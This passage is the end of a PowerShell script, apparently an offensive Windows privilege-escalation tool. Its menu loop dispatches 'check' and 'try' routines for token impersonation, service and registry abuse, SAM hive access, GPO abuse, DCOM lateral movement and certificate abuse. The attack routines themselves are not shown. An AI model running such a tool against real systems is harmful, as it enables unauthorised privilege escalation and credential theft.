    if ($DEBUG_MODE) { Write-Output "End. parsedInput var:" $parsedInput }

    return @{ Selections = $parsedInput; ScanOnly = $scanOnly; TryAll = $tryAll }
}

# Main function that runs the selected techniques
function main {
    while ($true) {
        showMenu
        $choice = Read-Host "Your selection"
        if ($DEBUG_MODE) { Write-Output "Raw Input:" $choice }

        $inputData = processInput $choice
        $selections = $inputData.Selections
        $scanOnly = $inputData.ScanOnly

        if ($DEBUG_MODE) { Write-Output "Processed Selections:" $selections }

        if ($selections.Count -eq 0) {
            Write-Output "No valid selections made. Exiting..."
            return
        }

        foreach ($selection in $selections) {
            switch ($selection) {
                1 { checkSePrivileges; if (-not $scanOnly) { trySePrivileges } }
                2 { checkServiceMisconfigurations; if (-not $scanOnly) { tryServiceMisconfigurations } }
                3 { checkScheduledTasks; if (-not $scanOnly) { tryScheduledTasks } }
                4 { checkWMIEventSubscription; if (-not $scanOnly) { tryWMIEventSubscription } }
                5 { checkTokenImpersonation; if (-not $scanOnly) { tryTokenImpersonation } }
                6 { checkRegistryKeyAbuse; if (-not $scanOnly) { tryRegistryKeyAbuse } }
                7 { checkSAMHiveAccess; if (-not $scanOnly) { trySAMHiveAccess } }
                8 { checkAutorunAbuse; if (-not $scanOnly) { tryAutorunAbuse } }
                9 { checkGPOAbuse; if (-not $scanOnly) { tryGPOAbuse } }
                10 { checkCOMObjectAbuse; if (-not $scanOnly) { tryCOMObjectAbuse } }
                11 { checkDCOMLateralMovement; if (-not $scanOnly) { tryDCOMLateralMovement } }
                12 { checkEFSSettings; if (-not $scanOnly) { tryEFSSettings } }
                13 { checkCertySAN; }
                14 { run_SH_collection; }
                default { Write-Output "Invalid selection: $selection" }
            }
        }
    }
}

main
